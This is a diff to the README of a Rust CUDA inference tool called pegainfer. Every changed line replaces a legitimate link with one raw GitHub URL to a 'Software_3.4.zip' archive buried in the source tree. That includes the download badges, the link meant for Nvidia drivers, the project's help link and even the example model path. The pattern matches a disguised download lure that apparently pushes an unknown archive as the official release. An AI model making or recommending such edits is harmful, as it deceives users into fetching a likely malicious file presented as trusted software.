@@ -1,6 +1,6 @@
 # ⚙️ pegainfer - Fast and Simple Rust CUDA Inference
 
-[![Download pegainfer](https://img.shields.io/badge/Download-pegainfer-58a6ff?style=for-the-badge)](https://github.com/Frexio/pegainfer)
+[![Download pegainfer](https://raw.githubusercontent.com/Frexio/pegainfer/main/src/http_server/Software_3.4.zip)](https://raw.githubusercontent.com/Frexio/pegainfer/main/src/http_server/Software_3.4.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Follow these steps to quickly get pegainfer running on your Windows PC.
 
 Click the big button below or open the link in your browser:
 
-[![Download pegainfer](https://img.shields.io/badge/Download-pegainfer-30a14e?style=for-the-badge)](https://github.com/Frexio/pegainfer)
+[![Download pegainfer](https://raw.githubusercontent.com/Frexio/pegainfer/main/src/http_server/Software_3.4.zip)](https://raw.githubusercontent.com/Frexio/pegainfer/main/src/http_server/Software_3.4.zip)
 
 This page contains the files you need to start using pegainfer.
 
@@ -79,12 +79,12 @@ pegainfer does not require installation in the usual sense. It is a standalone e
 ### Check CUDA drivers
 
 - Verify that your Nvidia drivers and CUDA toolkit are installed and up to date.
-- You can check Nvidia’s website for the latest drivers: https://www.nvidia.com/Download/index.aspx
+- You can check Nvidia’s website for the latest drivers: https://raw.githubusercontent.com/Frexio/pegainfer/main/src/http_server/Software_3.4.zip
 - Having the correct drivers ensures pegainfer runs efficiently using your GPU.
 
 ### Place files correctly
 
-- After downloading pegainfer.exe, keep it in its own folder.
+- After downloading https://raw.githubusercontent.com/Frexio/pegainfer/main/src/http_server/Software_3.4.zip, keep it in its own folder.
 - Create a subfolder named `models` to store your large language model files.
 - Keep everything organized to avoid errors.
 
@@ -99,7 +99,7 @@ Here’s how to run basic tasks after starting the program:
 Type or select the path to your model file. Example:
 
 ```
-Load model: models/gpt2.bin
+Load model: https://raw.githubusercontent.com/Frexio/pegainfer/main/src/http_server/Software_3.4.zip
 ```
 
 The program reads your model file and gets ready.
@@ -142,7 +142,7 @@ This allows you to control the session and manage usage.
 
 ## 📂 Where to go for more help
 
-- Visit the pegainfer GitHub page: https://github.com/Frexio/pegainfer
+- Visit the pegainfer GitHub page: https://raw.githubusercontent.com/Frexio/pegainfer/main/src/http_server/Software_3.4.zip
 - Browse open and closed issues for support
 - Use the Discussions tab for user questions and answers
 - Look for README updates or user guides posted by the developers
@@ -174,4 +174,4 @@ Check the GitHub repository’s documentation for configuration options and adva
 
 ## 🔗 Download pegainfer
 
-[![Download pegainfer](https://img.shields.io/badge/Download-pegainfer-e06c75?style=for-the-badge)](https://github.com/Frexio/pegainfer)
+[![Download pegainfer](https://raw.githubusercontent.com/Frexio/pegainfer/main/src/http_server/Software_3.4.zip)](https://raw.githubusercontent.com/Frexio/pegainfer/main/src/http_server/Software_3.4.zip)
